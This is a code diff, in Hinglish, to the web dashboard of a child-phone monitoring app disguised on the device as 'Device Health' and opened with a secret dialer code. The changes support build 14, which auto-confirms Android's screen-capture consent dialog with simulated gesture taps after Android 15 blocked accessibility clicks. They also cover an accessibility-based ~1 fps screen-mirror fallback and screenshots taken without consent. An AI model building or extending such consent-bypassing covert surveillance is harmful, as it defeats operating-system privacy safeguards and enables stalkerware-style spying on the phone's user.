@@ -11,8 +11,8 @@
 // consent auto-click ab SAARI a11y windows scan karta hai + honest diag
 // (clickPassRuns/SawBtn/dialogPkg/consentResult) se Phone check exact batata hai
 // ki Live ke liye child par "Start now" manually dabana hai ya nahi.
-const LATEST_VC = 13;
-const LATEST_V = "1.12";
+const LATEST_VC = 14;
+const LATEST_V = "1.13";
 
 const S = {
   token: localStorage.getItem("fg_token") || "",
@@ -804,7 +804,9 @@ function handleWs(m) {
         if (S.streaming) {
           setMirrorBtn(true);
           S.lastFrameAt = Date.now(); // grace window for the "no frames" watchdog
-          mirrorStatus("Bachche ki screen mirroring chalu ho gayi ✓", false);
+          // vc14: a11y fallback (~1 fps) bhi streaming=true bhejta hai apne reason
+          // ke saath — parent ko pata chale ki low-fps mode hai, bug nahi.
+          mirrorStatus(m.reason ? "Live chalu ✓ — " + m.reason : "Bachche ki screen mirroring chalu ho gayi ✓", false);
         } else if (S.mirrorOn) {
           setMirrorBtn(true);
           // Child se HONEST reason aaye (consent fail / a11y off / OEM block /
@@ -1410,7 +1412,7 @@ function renderMirrorDiag(d) {
     // vc13 honest diag: dialog khula tha? button a11y ko dikha tha? result kya raha?
     let extra = "";
     if (d.consentResult === "denied") extra = " · <b>⚠️ pichhli baar CANCEL dab gaya tha</b> — is baar dialog par “Start now” dabao";
-    else if (d.consentResult === "timeout") extra = " · pichhli koshish me confirm nahi hua (40s timeout)";
+    else if (d.consentResult === "timeout") extra = " · pichhli koshish me confirm nahi hua (70s timeout)";
     if (d.consentUiSeen === false) extra += " · <b>⚠️ dialog bachche ke phone par KHULA HI NAHI</b> (OEM ne block kiya)";
     else if (typeof d.clickPassRuns === "number" && d.clickPassRuns > 0) {
       extra += d.clickPassSawBtn === true
@@ -1432,6 +1434,8 @@ function renderMirrorDiag(d) {
   // vc13: screenshot ab a11y takeScreenshot se aata hai (zero-touch) — capability
   // report me dikhao taaki a11y OFF/capability miss turant pakda jaye.
   if (typeof d.a11yShot === "boolean") rows.push(diagRow(d.a11yShot, "Screenshot (a11y)", d.a11yShot ? "ready ✓ — consent ke bina capture hoga" : "ready NAHI (a11y OFF ya capability miss)", d.a11yShot ? "" : "Settings → Accessibility → Device Health → OFF karke fir ON karo, phir Phone check dobara"));
+  // vc14: a11y fallback mirror (~1 fps) — consent block hone par bhi live isse chalta hai
+  if (d.fallbackActive === true) rows.push("<li>🐢 <b>Mirror mode:</b> a11y fallback (<b>~1 fps</b>) — consent auto-click is phone par block hai, par live is safe mode me chal raha hai" + (typeof d.fallbackFrames === "number" ? " · " + d.fallbackFrames + " frames gaye" : "") + "</li>");
   rows.push(diagRow(h.overlay !== false, "Display over apps", h.overlay === false ? "OFF" : "ON ✓", h.overlay === false ? "Settings → Apps → Device Health → Display over other apps → Allow" : ""));
   rows.push(diagRow(h.canInstall !== false, "Install unknown apps", h.canInstall === false ? "OFF (auto-update nahi hoga)" : "ON ✓", h.canInstall === false ? "Settings → Apps → Device Health → Install unknown apps → Allow" : ""));
   if (typeof d.frames === "number") rows.push("<li>🎞 <b>Frames (is session):</b> " + d.frames + (d.lastFrameAgoSec != null ? " · last frame " + d.lastFrameAgoSec + "s pehle" : "") + "</li>");
@@ -1453,8 +1457,9 @@ function renderMirrorDiag(d) {
   else if (h.overlay === false) verdict = "👉 <b>Display over apps OFF hai — background me consent khulti hi nahi. Allow karo, phir dobara try karo.</b>";
   else if (d.consentPending && d.consentUiSeen === false) verdict = "👉 <b>Consent dialog bachche ke phone par khula HI nahi (OEM ne block kiya). Bachche ke phone par Device Health app ek baar kholo (dial *#*#2724#*#*), phir Live tab se Mirror dobara shuru karo.</b>";
   else if (d.consentPending && d.consentResult === "denied") verdict = "👉 <b>Pichhli baar consent dialog par CANCEL dab gaya tha. Mirror band karke dobara shuru karo — dialog aaye to “Start now” dabana zaroori hai (Live streaming ke liye Android ko har baar permission chahiye).</b>";
-  else if (d.consentPending && d.clickPassRuns > 0 && d.clickPassSawBtn === false) verdict = "👉 <b>Dialog khula par a11y click ko dialog nahi dikha. Ab ke Android 15 me system consent par auto-click rok deta hai — Live ke liye bachche ke phone par dialog ka “Start now” EK BAAR khud dabao. 📸 Screenshot ki zaroorat nahi — wo ab a11y se khud aayega (build 13).</b>";
-  else if (d.consentPending && d.clickPassSawBtn === true) verdict = "👉 <b>Auto-click ne “Start now” dekha par confirm nahi hua — Android 15 ne click block kiya hoga. Bachche ke phone par dialog khud dikhega, wahan “Start now” EK BAAR dabao — Live turant chalega. 📸 Screenshot ab khud chalega (a11y path).</b>";
+  else if (d.consentPending && d.clickPassRuns > 0 && d.clickPassSawBtn === false) verdict = "👉 <b>Dialog khula par a11y click ko dialog nahi dikha. Naya build (14) real touch (gesture tap) bhi try karta hai — phir bhi na ho to Mirror apne aap 1 fps fallback me chal jayega (Live dikhega).</b>";
+  else if (d.consentPending && d.clickPassSawBtn === true) verdict = "👉 <b>Auto-click ne \u201cStart now\u201d dekha par ACTION_CLICK ignore hua — naya build (14) ab real touch (gesture tap) se confirm karega. Agar wo bhi na chale to Mirror khud 1 fps fallback mode me live dikhega.</b>";
+  else if (d.fallbackActive === true) verdict = "👉 🐢 <b>Mirror a11y fallback mode me LIVE hai (~1 fps)</b> — Live tab par screen dikh rahi hogi. Ye safe mode hai jab consent dialog auto-confirm nahi hota; real-time 8 fps ke liye bachche ke phone par ek baar dialog ka “Start now” khud dabao.";
   else if (d.consentPending) verdict = "👉 <b>Consent abhi confirm ho raha hai — 10 sec ruko. Phir bhi screen na aaye to Mirror band karke dobara shuru karo.</b>";
   else if ((d.frames || 0) === 0 && h.mirrorReady !== true) verdict = "👉 <b>Capture session start nahi hua — Mirror band karo, 5 sec ruko, phir dobara “▶ Mirror shuru karo” dabao.</b>";
   else verdict = "👉 <b>Phone side theek lag raha hai — 5–10 sec me frames aane chahiye. Nahi aaye to Mirror band → dobara shuru karo.</b>";
